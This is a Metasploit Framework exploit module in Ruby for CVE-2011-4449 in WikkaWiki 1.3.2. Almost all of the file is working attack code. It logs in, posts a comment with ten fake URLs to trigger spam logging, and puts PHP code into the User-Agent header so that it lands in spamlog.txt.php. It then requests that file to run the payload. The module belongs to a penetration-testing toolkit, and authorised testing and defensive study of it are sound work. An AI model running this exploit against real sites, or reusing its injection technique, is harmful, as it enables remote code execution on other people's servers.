# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "WikkaWiki 1.3.2 Spam Logging PHP Injection",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in WikkaWiki.  When the spam logging
        feature is enabled, it is possible to inject PHP code into the spam log file via the
        UserAgent header , and then request it to execute our payload.  There are at least
        three different ways to trigger spam protection, this module does so by generating
        10 fake URLs in a comment (by default, the max_new_comment_urls parameter is 6).

          Please note that in order to use the injection, you must manually pick a page
        first that allows you to add a comment, and then set it as &#039;PAGE&#039;.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;EgiX&#039;,   #Initial discovery, PoC
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2011-4449&#039;],
          [&#039;OSVDB&#039;, &#039;77391&#039;],
          [&#039;EDB&#039;, &#039;18177&#039;],
          [&#039;URL&#039;, &#039;http://wush.net/trac/wikka/ticket/1098&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Targets&#039;        =>
        [
          [&#039;WikkaWiki 1.3.2 r1814&#039;, {}]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Nov 30 2011",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;WikkaWiki username&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;WikkaWiki password&#039;]),
        OptString.new(&#039;PAGE&#039;,      [true, &#039;Page to inject&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to WikkaWiki&#039;, &#039;/wikka/&#039;])
      ], self.class)
  end


  def check
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{target_uri.path}wikka.php?wakka=HomePage"
    })

    if res and res.body =~ /Powered by WikkaWiki/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end


  #
  # Get the cookie before we do any of that login/exploity stuff
  #
  def get_cookie
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{@base}wikka.php"
    })

    # Get the cookie in this format:
    # 96522b217a86eca82f6d72ef88c4c7f4=pr5sfcofh5848vnc2sm912ean2; path=/wikka
    if res and res.headers[&#039;Set-Cookie&#039;]
      cookie = res.headers[&#039;Set-Cookie&#039;].scan(/(\w+\=\w+); path\=.+$/).flatten[0]
    else
      raise RuntimeError, "#{@peer} - No cookie found, will not continue"
    end

    cookie
  end


  #
  # Do login, and then return the cookie that contains our credential
  #
  def login(cookie)
    # Send a request to the login page so we can obtain some hidden values needed for login
    uri = "#{@base}wikka.php?wakka=UserSettings"
    res = send_request_raw({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => uri,
      &#039;cookie&#039;  => cookie
    })

    # Extract the hidden fields
    login = {}
    if res and res.body =~ /\<div id\=\"content\"\>.+\<fieldset class\=\"hidden\"\>(.+)\<\/fieldset\>.+\<legend\>Login\/Register\<\/legend\>/m
      fields = $1.scan(/\<input type\=\"hidden\" name\=\"(\w+)\" value\=\"(\w+)\" \/>/)
      fields.each do |name, value|
        login[name] = value
      end
    else
      raise RuntimeError, "#{@peer} - Unable to find the hidden fieldset required for login"
    end

    # Add the rest of fields required for login
    login[&#039;action&#039;]       = &#039;login&#039;
    login[&#039;name&#039;]         = datastore[&#039;USERNAME&#039;]
    login[&#039;password&#039;]     = datastore[&#039;PASSWORD&#039;]
    login[&#039;do_redirect&#039;]  = &#039;on&#039;
    login[&#039;submit&#039;]       = "Login"
    login[&#039;confpassword&#039;] = &#039;&#039;
    login[&#039;email&#039;]        = &#039;&#039;

    port = (rport.to_i == 80) ? "" : ":#{rport}"
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => uri,
      &#039;cookie&#039;    => cookie,
      &#039;headers&#039;   => { &#039;Referer&#039; => "http://#{rhost}#{port}#{uri}" },
      &#039;vars_post&#039; => login
    })

    if res and res.headers[&#039;Set-Cookie&#039;] =~ /user_name/
      user = res.headers[&#039;Set-Cookie&#039;].scan(/(user_name\@\w+=\w+);/)[0] || ""
      pass = res.headers[&#039;Set-Cookie&#039;].scan(/(pass\@\w+=\w+)/)[0] || ""
      cookie_cred = "#{cookie}; #{user}; #{pass}"
    else
      cred = "#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}"
      raise RuntimeError, "#{@peer} - Unable to login with \"#{cred}\""
    end

    return cookie_cred
  end


  #
  # After login, we inject the PHP payload
  #
  def inject_exec(cookie)
    # Get the necessary fields in order to post a comment
    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{@base}wikka.php?wakka=#{datastore[&#039;PAGE&#039;]}&show_comments=1",
      &#039;cookie&#039; => cookie
    })

    fields = {}
    if res and res.body =~ /\<form action\=.+processcomment.+\<fieldset class\=\"hidden\"\>(.+)\<\/fieldset\>/m
      $1.scan(/\<input type\=\"hidden\" name\=\"(\w+)\" value\=\"(.+)\" \/>/).each do |n, v|
        fields[n] = v
      end
    else
      raise RuntimeError, "#{@peer} - Cannot get necessary fields before posting a comment"
    end

    # Generate enough URLs to trigger spam logging
    urls = &#039;&#039;
    10.times do |i|
      urls << "http://www.#{rand_text_alpha_lower(rand(10)+6)}.#{[&#039;com&#039;, &#039;org&#039;, &#039;us&#039;, &#039;info&#039;].sample}\n"
    end

    # Add more fields
    fields[&#039;body&#039;]   = urls
    fields[&#039;submit&#039;] = &#039;Add&#039;

    # Inject payload
    b64_payload = Rex::Text.encode_base64(payload.encoded)
    port = (rport.to_i == 80) ? "" : ":#{rport}"
    uri = "#{@base}wikka.php?wakka=#{datastore[&#039;PAGE&#039;]}/addcomment"
    post_data = ""
    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "#{@base}wikka.php?wakka=#{datastore[&#039;PAGE&#039;]}/addcomment",
      &#039;cookie&#039;    => cookie,
      &#039;headers&#039;   => { &#039;Referer&#039; => "http://#{rhost}:#{port}/#{uri}" },
      &#039;vars_post&#039; => fields,
      &#039;agent&#039;     => "<?php #{payload.encoded} ?>"
    })

    send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "#{@base}spamlog.txt.php"
    })
  end


  def exploit
    @peer = "#{rhost}:#{rport}"

    @base = target_uri.path
    @base << &#039;/&#039; if @base[-1, 1] != &#039;/&#039;

    print_status("#{@peer} - Getting cookie")
    cookie = get_cookie

    print_status("#{@peer} - Logging in")
    cred = login(cookie)

    print_status("#{@peer} - Triggering spam logging")
    inject_exec(cred)

    handler
  end
end


=begin
For testing:
svn -r 1814 co https://wush.net/svn/wikka/trunk wikka

Open wikka.config.php, do:
&#039;spam_logging&#039; => &#039;1&#039;
=end



